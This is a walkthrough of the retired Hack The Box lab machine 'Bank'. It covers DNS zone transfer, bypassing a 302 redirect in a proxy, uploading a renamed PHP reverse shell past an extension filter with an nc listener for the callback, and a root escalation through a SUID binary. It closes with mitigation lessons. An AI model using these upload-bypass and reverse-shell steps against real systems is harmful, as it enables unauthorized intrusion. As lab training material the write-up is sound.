---
machine: Bank
os: Linux
difficulty: Easy
platform: Hack The Box
category: Machines
state: Retired
tags: [linux, dns, axfr, upload-bypass, suid]
---

# Bank — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Retired, publishable writeup.
> Reference notes for a retired box. No real flags or credentials.

## TL;DR

The DNS zone transfers and reveals `bank.htb` and `chris.bank.htb`. On `bank.htb` there is a login panel and a `support.php` that answers `302` to everyone: flip the status to `200` in the proxy and the upload form appears. The whitelist only allows `.htb`, but Apache serves that extension as PHP, so the reverse shell goes in renamed. Inside, a SUID binary shipped with the box (`/var/htb/bin/emergency`) hands over root.

## Recon

```bash
nmap -sC -sV -p- <IP> -oN nmap.txt
```

```text
22/tcp  ssh   OpenSSH 6.6.1p1
53/tcp  dns   ISC BIND 9.9.5-3
80/tcp  http  Apache httpd 2.4.29
```

## Enumeration

```bash
dig axfr @<IP> bank.htb
```

```text
bank.htb.        604800 IN A <IP>
chris.bank.htb.  604800 IN A <IP>
admin.bank.htb.  604800 IN A <IP>
```

```bash
echo "<IP> bank.htb chris.bank.htb admin.bank.htb" | sudo tee -a /etc/hosts
gobuster dir -u http://bank.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html
```

`chris.bank.htb` is the default Apache page. `bank.htb` exposes a login, `index.php` and a `support.php` that redirects to the login with `302` even without a session.

## Foothold

The `302` is cosmetic: the form HTML travels in the response anyway. Intercept in Burp, change the status to `200 OK`, and the ticket form shows up along with an attachment upload.

```text
POST /support.php HTTP/1.1
...
Content-Disposition: form-data; name="file"; filename="php-reverse-shell.htb"
```

The check is extension-based: `.htb` is accepted, `.php` rejected. But Apache's `AddHandler` maps `.htb` to PHP, so renaming the shell is enough:

```bash
cp /usr/share/webshells/php/php-reverse-shell.php shell.htb
# set IP/port inside the file
curl -F "file=@shell.htb" http://bank.htb/support.php   # or use the form
curl http://bank.htb/uploads/shell.htb
```

```bash
nc -lvnp 4444
```

```text
www-data@bank:/var/www/bank$
```

## Escalation

```bash
find / -perm -u=s -type f 2>/dev/null
```

```text
/var/htb/bin/emergency
```

It is a binary shipped with the box, owned by root and SUID. Running it opens a shell with no checks:

```bash
/var/htb/bin/emergency
```

```text
# id
uid=0(root) gid=0(root) groups=0(root)
```

## Evidence (redacted)

```text
/home/chris/user.txt  -> <user_flag>
/root/root.txt        -> <root_flag>
```

## Lessons

- A `302` does not protect a resource: the body is sent regardless and flipping the code exposes it.
- Extension filtering is useless when the server maps arbitrary extensions to an interpreter; validate the real type and serve uploads outside the executable tree.
- A "house" SUID binary is a permanent backdoor: audit with `find -perm -4000` and justify every entry.
- Mitigation: real session checks in `support.php`, MIME whitelisting, and `php_admin_flag engine off` in the upload directory.
